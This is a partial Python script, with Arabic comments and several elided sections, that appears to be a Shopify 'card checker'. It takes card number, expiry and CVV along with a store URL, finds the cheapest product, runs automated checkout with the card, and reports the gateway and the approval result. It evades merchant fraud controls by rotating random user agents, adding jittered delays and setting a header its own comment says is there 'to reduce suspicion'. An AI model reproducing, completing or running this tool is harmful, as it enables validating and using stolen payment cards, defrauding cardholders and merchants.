...
import time
import random
from user_agent import generate_user_agent # 🔥 أضف هذا السطر
# ... (بقية الـ import)
...
def find_between(text, start, end):
    try:
        ...
        return None
def detect_gateway(payment_identifier):
    if not payment_identifier:
        return "shopify_payments"

    identifier = payment_identifier.lower()

    if "shopify" in identifier or "card" in identifier:
        return "Shopify Payments"
    elif "paypal" in identifier:
        return "PayPal"
    elif "stripe" in identifier:
        return "Stripe"
    elif "adyen" in identifier:
        return "Adyen"
    elif "braintree" in identifier:
        return "Braintree"
    elif "authorize.net" in identifier:
        return "authorize.net"

    return payment_identifier  # fallback
def create_session(shop_url, proxies=None):
    session = requests.Session()
    session.trust_env = False if proxies else True
    
    # 🔥 التعديل الجديد: توليد User-Agent عشوائي باستخدام المكتبة
    # هذا سيقوم بإنشاء هوية متصفح عشوائية وحديثة في كل مرة
    random_user_agent = generate_user_agent()
    
    session.headers.update({
        'User-Agent': random_user_agent, # استخدام الهوية التي تم توليدها
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9', # لغة إنجليزية لتقليل الشكوك
...
def auto_detect_cheapest_product(session, shop_url):
    ...
    time.sleep(random.uniform(2.5, 1.5))
    ...
    try:
        time.sleep(random.uniform(2.3, 0.8))
...
def step1_add_to_cart(session):
    ...
    if '/checkouts/cn/' in final_url:
        ...
        PAYMENT_METHOD_IDENTIFIER = find_between(r.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        print('##YASIRTOOOK꧁꧂ | '+PAYMENT_METHOD_IDENTIFIER)

    if not PAYMENT_METHOD_IDENTIFIER:
        print("  [ERROR] paymentMethodIdentifier not found – aborting safely")
        return None, None, None, None
    
    print("  [OK] paymentMethodIdentifier captured")
    return checkout_token, PAYMENT_METHOD_IDENTIFIER, session_token, r.cookies
def extract_pay(html):
    from html import unescape

    patterns = [
        r'<meta\s+name="paymentMethodIdentifier"\s+content="([^"]+)"',
    ...
    for pattern in patterns:
        ...
        if m:
            token = unescape(m.group(1)).strip()
            if len(token) >= 32:
                print("  [OK] paymentMethodIdentifier extracted")
                return token
...
def step1_add_to_cart_ctx(session, shop_url, variant_id, _429_retry_count=0):
    ...
    try:
        ...
        raise
    time.sleep(random.uniform(2.8, 1.5))
    ...
    if '/checkouts/cn/' in final_url:
        ...
        text = r.text
        PAYMENT_METHOD_IDENTIFIER = find_between(r.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        print('[><><><>]'+PAYMENT_METHOD_IDENTIFIER)
...
def step2_tokenize_card_ctx(session, checkout_token, shop_url, card_data):
    ...
    time.sleep(random.uniform(2.2, 1.0))
...
def step4_submit_completion_ctx(session, checkout_token, session_token, queue_token,
    ...
    print("[4/5] Submitting for completion...")
    print(f'[4\5] PAYMENT_METHOD_IDENTIFIER {PAYMENT_METHOD_IDENTIFIER}')
    print(f"  [INFO] Phone requirement: {phone_required}")
    
    time.sleep(random.uniform(2.0, 1.5))
    ...
    try:
        ...
        r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        #print(f"  [DEBUG] Step 4 - Response status: {r.text}")
...
def check_card():
    try:
        ...
        if not cc or not url:
            return jsonify({"status": "error", "message": "Missing cc or url"})

        # تقسيم الكارت
        parts = cc.split("|")
        if len(parts) != 4:
            return jsonify({"status": "error", "message": "Invalid cc format"})

        number, month, year, cvv = parts

        global SHOP_URL, CARD_DATA

        SHOP_URL = normalize_shop_url(url)
        ...
        # 👇 شغل الخطوات
        best_product = auto_detect_cheapest_product(session, SHOP_URL)
        if not best_product or len(best_product) < 4:
            return jsonify({"status": "error", "message": "No product found"})
        
        pid, vid, price, title = best_product

        global VARIANT_ID
        VARIANT_ID = vid

        res_step1 = step1_add_to_cart(session)
        if not res_step1 or len(res_step1) < 4:
            return jsonify({"status": "error", "message": "Checkout failed (Step 1)"})
            
        checkout_token, payment_id, session_token, cookies = res_step1

        if not checkout_token:
            return jsonify({"status": "error", "message": "Checkout failed (No token)"})

        card_token = step2_tokenize_card(session, checkout_token)

        if not card_token:
            return jsonify({"status": "declined", "message": "Tokenization failed"})

        queue_token, shipping_handle, merch_id, total, expectations, phone_required = step3_proposal(
            session, checkout_token, session_token, card_token
        )

        receipt_id, status, message, resp = step4_submit_completion(
            session, checkout_token, session_token, queue_token,
            shipping_handle, merch_id, card_token,
            total, expectations, phone_required
        )

        success, final_resp, log = step5_poll_receipt(
            session, checkout_token, session_token, receipt_id
        )
        
        # استخراج كود الاستجابة بشكل آمن
        try:
            response_code = extract_receipt_code(final_resp)
        except Exception:
            response_code = "UNKNOWN_ERROR"

        cc_string = f"{CARD_DATA['number']}|{str(CARD_DATA['month']).zfill(2)}|{CARD_DATA['year']}|{CARD_DATA['verification_value']}"
        
        # جلب اسم البوابة (Gate)
        try:
            gate_name = detect_gateway(PAYMENT_METHOD_IDENTIFIER)
        except Exception:
            gate_name = "shopify_payments"

        # تنسيق السعر
        try:
            price_val = total if total else "0.0"
        except Exception:
            price_val = "0.0"
        ...
        if success:
            return jsonify({
                ...
                "Gate": gate_name,
                "Site": SHOP_URL,
                "Full_Response": final_resp  # إرجاع الاستجابة الكاملة للفحص
            })
        else:
            return jsonify({
                "status": "failed",
